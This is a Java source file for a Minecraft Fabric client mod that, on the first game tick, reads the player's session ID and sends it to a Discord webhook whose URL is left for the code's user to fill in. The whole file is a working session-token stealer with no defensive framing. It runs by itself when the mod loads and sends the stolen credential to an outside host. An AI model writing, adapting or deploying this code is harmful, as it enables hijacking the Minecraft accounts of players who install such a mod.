package spigotlabs.sessionid.client;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.minecraft.client.MinecraftClient;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SessionidClient implements ClientModInitializer {

    private static final String WEBHOOK_URL = "INPUT YOUR DISCORD WEBHOOK HERE";
    private boolean sessionSent = false;

    @Override
    public void onInitializeClient() {

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (!sessionSent) {
                sendSessionIDToDiscord();
                sessionSent = true;
            }
        });
    }

    private void sendSessionIDToDiscord() {
        try {
            String sessionID = MinecraftClient.getInstance().getSession().getSessionId();

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; utf-8");
            connection.setRequestProperty("Accept", "application/json");
            connection.setDoOutput(true);

            String jsonPayload = "{\"content\":\"Session ID: " + sessionID + "\"}";

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                System.out.println("Session ID sent to Discord successfully.");
            } else {
                System.out.println("Failed to send Session ID to Discord. Response code: " + responseCode);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
